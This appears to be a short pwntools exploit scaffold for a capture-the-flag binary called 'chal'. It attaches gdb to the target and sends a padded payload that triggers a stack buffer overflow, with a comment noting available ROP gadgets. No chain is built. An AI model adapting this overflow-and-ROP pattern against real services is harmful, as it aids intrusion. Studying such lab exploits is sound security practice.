from pwn import *
import subprocess

if args.LOCAL:
    p = remote("localhost", 1337)
    while True:
        try:
            pid = subprocess.run(["pgrep", "-fx", "/app/run"], check=True, capture_output=True, encoding="utf-8").stdout
            pid = int(pid)
            break
        except subprocess.CalledProcessError:
            log.warn("failed to get pid")
    gdb.attach(pid, gdbscript="c", exe="./chal", sysroot=f"/proc/{pid}/root/")
else:
    p = gdb.debug("./chal", gdbscript="c")

file = ELF("./chal", checksec=False)
context.binary = file

payload = b"A" * 0x168 + b"B" * 8
p.sendlineafter(b".", payload)
# triggers bof. good enough. pop rax, rdi, rsi, rdx, syscall exists.

p.interactive()